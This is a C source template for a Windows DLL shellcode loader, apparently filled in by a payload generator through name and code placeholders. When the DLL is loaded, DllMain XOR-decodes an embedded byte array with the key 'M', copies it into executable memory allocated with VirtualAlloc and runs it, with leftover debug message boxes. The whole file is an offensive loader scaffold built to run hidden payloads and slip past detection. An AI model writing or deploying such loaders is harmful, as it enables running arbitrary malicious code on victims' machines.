#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#pragma comment(lib, "user32.lib")

unsigned char <NAME_TO_REPLACE>[] = <CODE_TO_REPLACE>; 

int <FUNCTION_TO_REPLACE>(void) {
    for (int i = 0; i < sizeof(<NAME_TO_REPLACE>); i++)
    {
        <NAME_TO_REPLACE>[i] = <NAME_TO_REPLACE>[i] ^ 'M';
    }

    MessageBox(NULL,"Program","is on progess",MB_OK);

    void *exec = VirtualAlloc(0, sizeof(<NAME_TO_REPLACE>), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, <NAME_TO_REPLACE>, sizeof(<NAME_TO_REPLACE>));
    ((void(*)())exec)();

    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD nReason, LPVOID lpReserved)
{
    switch (nReason){
    case DLL_PROCESS_ATTACH:
        <FUNCTION_TO_REPLACE>();
        MessageBox(NULL,"Checkpoint 2","done",MB_OK);
        break;
    case DLL_PROCESS_DETACH:
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}
